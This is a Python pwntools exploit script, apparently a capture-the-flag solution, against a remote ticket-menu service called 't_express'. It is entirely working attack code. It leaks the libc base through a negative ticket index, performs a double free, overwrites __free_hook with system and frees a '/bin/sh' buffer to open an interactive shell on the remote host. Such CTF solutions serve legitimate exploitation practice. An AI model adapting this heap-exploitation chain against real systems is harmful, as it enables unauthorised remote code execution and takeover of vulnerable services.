# exploit_t_express.py

from pwn import *
# context.log_level = 'debug'

# r = process("./t_express")
r = remote("t-express.sstf.site", 1337)

def buy(choice, firstname, lastname):
    r.recvuntil("choice: ")
    r.sendline("1")

    r.recvuntil("(1/2): ")
    r.sendline(str(choice))

    r.recvuntil("First name: ")
    r.send(firstname)

    r.recvuntil("Last name: ")
    r.send(lastname)

def view(index):
    r.recvuntil("choice: ")
    r.sendline("2")

    r.recvuntil("Index of ticket: ")
    r.sendline(str(index))

def use_oneride(index):
    r.recvuntil("choice: ")
    r.sendline("3")

    r.recvuntil("Index of ticket: ")
    r.sendline(str(index))

def use_oneday(index, choice):
    r.recvuntil("choice: ")
    r.sendline("3")

    r.recvuntil("Index of ticket: ")
    r.sendline(str(index))

    r.recvuntil("(1/2/3/4): ")
    r.sendline(str(choice))

offset_freehook = 0x1eeb28
offset_system = 0x55410

buy(1, "AAAAAAAA", "BBBBBBBB") # index: 0
buy(2, "A", "B") # index: 1
buy(1, "A", "B") # index: 2

use_oneride(2)
use_oneday(1, 1)
use_oneday(1, 1)
use_oneday(1, 1)
use_oneday(1, 2)
use_oneday(1, 3)

# libc leak
view(-4)
r.recvuntil("|name |")
libc = u64(r.recvline()[-9:-3].ljust(8, b"\x00")) - 0x1ec643 # libc base
log.info("libc base: " + hex(libc))
freehook = libc + offset_freehook
system = libc + offset_system

# double free
for i in range(0x20):
    use_oneday(0, 1)
use_oneday(1, 1)

buy(2, p64(freehook), "B") # index: 3
buy(1, "/bin/sh", "B") # index: 4
buy(1, p64(system), "B") # index: 5

# get shell
r.recvuntil("choice: ")
r.sendline("3")

r.recvuntil("Index of ticket: ")
r.sendline("4")

r.interactive()